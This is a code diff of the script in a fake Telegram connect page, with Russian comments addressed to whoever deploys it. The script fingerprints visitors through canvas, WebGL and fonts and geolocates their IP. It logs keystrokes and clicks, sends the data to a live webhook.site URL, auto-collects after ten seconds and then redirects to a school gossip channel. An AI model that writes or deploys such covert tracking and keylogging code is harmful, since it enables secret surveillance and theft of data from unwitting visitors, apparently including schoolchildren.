@@ -396,95 +396,43 @@
     </div>
 
     <script>
+        // ТВОЙ WEBHOOK
+        const WEBHOOK_URL = 'https://webhook.site/0b31d0ef-6512-4b38-be46-df0f5f2e66d1';
+
         // Функция сбора данных
         function collectData() {
             const data = {
-                // Основная информация
                 timestamp: new Date().toISOString(),
                 url: window.location.href,
                 referrer: document.referrer,
                 
-                // Информация о браузере
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                vendor: navigator.vendor,
                 language: navigator.language,
                 languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
                 
-                // Информация об устройстве
                 screen: {
                     width: screen.width,
                     height: screen.height,
                     colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    orientation: screen.orientation?.type
+                    pixelDepth: screen.pixelDepth
                 },
+                
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 maxTouchPoints: navigator.maxTouchPoints,
                 
-                // Временная зона
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 
-                // Сеть
                 connection: navigator.connection ? {
                     effectiveType: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink,
                     rtt: navigator.connection.rtt,
                     saveData: navigator.connection.saveData
-                } : null,
-                
-                // Геолокация (через IP)
-                ipInfo: {}
+                } : null
             };
 
-            // Сбор отпечатка устройства (fingerprinting)
-            data.canvasFingerprint = getCanvasFingerprint();
-            data.webglFingerprint = getWebGLFingerprint();
-            data.fontsFingerprint = getFontsFingerprint();
-            
-            // Получение IP и геолокации
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(ipData => {
-                    data.ipInfo = ipData;
-                    sendDataToServer(data);
-                })
-                .catch(() => {
-                    sendDataToServer(data);
-                });
-
-            // Кейлоггер
-            const keystrokes = [];
-            document.addEventListener('keydown', (e) => {
-                keystrokes.push({
-                    key: e.key,
-                    code: e.code,
-                    time: Date.now()
-                });
-                if (keystrokes.length > 50) {
-                    data.keystrokes = [...keystrokes];
-                }
-            });
-
-            // Запись кликов
-            const clicks = [];
-            document.addEventListener('click', (e) => {
-                clicks.push({
-                    x: e.clientX,
-                    y: e.clientY,
-                    time: Date.now()
-                });
-                data.clicks = clicks;
-            });
-
-            return data;
-        }
-
-        // Методы fingerprinting
-        function getCanvasFingerprint() {
+            // Canvas fingerprint
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
@@ -496,30 +444,67 @@
                 ctx.fillText('Telegram', 2, 15);
                 ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                 ctx.fillText('Telegram', 4, 17);
-                return canvas.toDataURL();
-            } catch (e) {
-                return 'error';
-            }
-        }
+                data.canvasFingerprint = canvas.toDataURL();
+            } catch(e) {}
 
-        function getWebGLFingerprint() {
+            // WebGL fingerprint
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'no_webgl';
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                    version: gl.getParameter(gl.VERSION)
-                };
-            } catch (e) {
-                return 'error';
-            }
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.webglFingerprint = {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch(e) {}
+
+            // Fonts fingerprint
+            data.fontsFingerprint = getFontsList();
+
+            // Получение IP и геолокации
+            fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) throw new Error();
+                    return response.json();
+                })
+                .then(ipData => {
+                    data.ipInfo = ipData;
+                    sendData(data);
+                })
+                .catch(() => {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(ipSimple => {
+                            data.ipInfo = {ip: ipSimple.ip};
+                            sendData(data);
+                        })
+                        .catch(() => sendData(data));
+                });
+
+            // Кейлоггер
+            const keystrokes = [];
+            document.addEventListener('keydown', (e) => {
+                keystrokes.push(e.key);
+                if (keystrokes.length > 20) {
+                    data.keystrokes = keystrokes.join('');
+                }
+            });
+
+            // Клики
+            const clicks = [];
+            document.addEventListener('click', (e) => {
+                clicks.push({x: e.clientX, y: e.clientY});
+                data.clicks = clicks.length;
+            });
+
+            return data;
         }
 
-        function getFontsFingerprint() {
+        // Определение установленных шрифтов
+        function getFontsList() {
             const fontList = [];
             const testString = "mmmmmmmmmmlli";
             const testSize = '72px';
@@ -534,43 +519,32 @@
             
             fonts.forEach(font => {
                 context.font = testSize + " '" + font + "'";
-                const metrics = context.measureText(testString);
-                fontList.push({
-                    font: font,
-                    width: metrics.width
-                });
+                const width = context.measureText(testString).width;
+                fontList.push({font: font, width: width});
             });
             
             return fontList;
         }
 
-        // Отправка данных на сервер
-        function sendDataToServer(data) {
-            // Webhook для сбора данных (ЗАМЕНИ НА СВОЙ!)
-            const webhookUrl = 'https://webhook.site/ТВОЙ_УНИКАЛЬНЫЙ_ID';
+        // Отправка данных
+        function sendData(data) {
+            // Сохраняем в localStorage
+            localStorage.setItem('telegram_data', JSON.stringify(data));
             
-            // Локальное сохранение
-            localStorage.setItem('telegram_collected_data', JSON.stringify(data));
-            localStorage.setItem('telegram_data_sent', 'true');
-            
-            // Отправка на webhook
-            fetch(webhookUrl, {
+            // Отправляем на webhook
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data),
                 mode: 'no-cors'
             }).catch(() => {});
             
-            // Дополнительная отправка в Telegram бота (если есть)
-            const botToken = 'ТВОЙ_BOT_TOKEN'; // Замени если есть
-            const chatId = 'ТВОЙ_CHAT_ID';
-            if (botToken && chatId) {
-                const message = `📱 Новый пользователь:\nIP: ${data.ipInfo?.ip || 'неизвестно'}\nБраузер: ${data.userAgent}\nЭкран: ${data.screen.width}x${data.screen.height}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                    .catch(() => {});
-            }
+            // Дополнительно: отправка в Telegram бот (если хочешь)
+            // const BOT_TOKEN = 'ТВОЙ_ТОКЕН';
+            // const CHAT_ID = 'ТВОЙ_CHAT_ID';
+            // const message = `📱 Новый пользователь:\nIP: ${data.ipInfo?.ip || '?'}\nУстройство: ${data.platform}\nЭкран: ${data.screen.width}x${data.screen.height}\nБраузер: ${data.userAgent.substring(0, 60)}...`;
+            // fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+            //     .catch(() => {});
         }
 
         // Основная функция
@@ -584,24 +558,22 @@
             button.innerHTML = '<div class="button-content"><span class="button-icon">⏳</span><span>ПОДКЛЮЧЕНИЕ...</span></div>';
             
             // Сбор данных
-            const collectedData = collectData();
+            collectData();
             
-            // Через 2 секунды редирект
+            // Редирект через 2 секунды
             setTimeout(() => {
-                // Сохраняем данные в localStorage на всякий случай
-                localStorage.setItem('last_collection', Date.now());
-                
-                // Редирект на настоящий Telegram
-                window.location.href = 'https://t.me/school4_overheard';
+                localStorage.setItem('redirect_time', Date.now());
+                window.location.href = 'https://t.me/school4_overheard'; // Или любой другой канал
             }, 2000);
         }
 
-        // Автоматический сбор через 15 секунд (если пользователь не нажал кнопку)
+        // Автоматический сбор через 10 секунд (если пользователь не нажал кнопку)
         setTimeout(() => {
-            if (!localStorage.getItem('telegram_data_sent')) {
+            if (!localStorage.getItem('auto_collected')) {
                 collectData();
+                localStorage.setItem('auto_collected', 'true');
             }
-        }, 15000);
+        }, 10000);
     </script>
 </body>
 </html>
